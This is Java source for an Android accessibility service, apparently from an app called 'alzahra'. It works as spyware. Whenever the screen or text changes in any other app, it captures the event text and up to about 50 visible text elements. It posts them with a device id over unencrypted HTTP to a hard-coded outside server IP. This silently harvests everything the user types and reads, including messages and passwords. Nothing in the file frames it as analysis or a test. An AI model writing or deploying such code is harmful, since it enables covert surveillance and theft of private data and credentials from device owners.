package com.alzahra.service;

import android.accessibilityservice.AccessibilityService;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.List;

public class AlzahraAccessibilityService extends AccessibilityService {
    private static final String TAG = "AlZahraAcc";
    private static final String SERVER = "http://216.128.156.226:8443";
    private String deviceId = "UNKNOWN";

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        try {
            deviceId = getSharedPreferences("alzahra_prefs", MODE_PRIVATE)
                .getString("device_id", "UNKNOWN");
            Log.d(TAG, "Accessibility service connected");
        } catch (Exception e) {
            Log.e(TAG, "Init error", e);
        }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        try {
            int type = event.getEventType();
            if (type == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED ||
                type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
                type == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                
                AccessibilityNodeInfo root = getRootInActiveWindow();
                if (root != null) {
                    String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "";
                    if (pkg.equals("com.alzahra")) return;
                    
                    JSONObject obj = new JSONObject();
                    obj.put("package", pkg);
                    obj.put("event_type", type);
                    obj.put("text", event.getText().toString());
                    obj.put("content_desc", event.getContentDescription() != null ? event.getContentDescription().toString() : "");
                    obj.put("time", System.currentTimeMillis());
                    
                    JSONArray screenText = new JSONArray();
                    extractScreenText(root, screenText);
                    obj.put("screen_text", screenText);
                    
                    sendToServer("accessibility", obj.toString());
                    root.recycle();
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Event error", e);
        }
    }

    private void extractScreenText(AccessibilityNodeInfo node, JSONArray arr) {
        if (arr.length() > 50) return;
        if (node == null) return;
        try {
            if (node.getText() != null) {
                String text = node.getText().toString();
                if (!text.isEmpty()) {
                    JSONObject obj = new JSONObject();
                    obj.put("text", text);
                    obj.put("class", node.getClassName() != null ? node.getClassName().toString() : "");
                    arr.put(obj);
                }
            }
        } catch (Exception ignored) {}
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            extractScreenText(child, arr);
            if (child != null) child.recycle();
        }
    }

    @Override
    public void onInterrupt() {
        Log.d(TAG, "Accessibility interrupted");
    }

    private void sendToServer(String type, String content) {
        new Thread(() -> {
            try {
                URL url = new URL(SERVER + "/api/data");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                conn.setConnectTimeout(10000);
                
                JSONObject json = new JSONObject();
                json.put("device_id", deviceId);
                json.put("type", type);
                json.put("content", content);
                json.put("time", System.currentTimeMillis());
                
                conn.getOutputStream().write(json.toString().getBytes());
                conn.getResponseCode();
                conn.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "Send error", e);
            }
        }).start();
    }
}
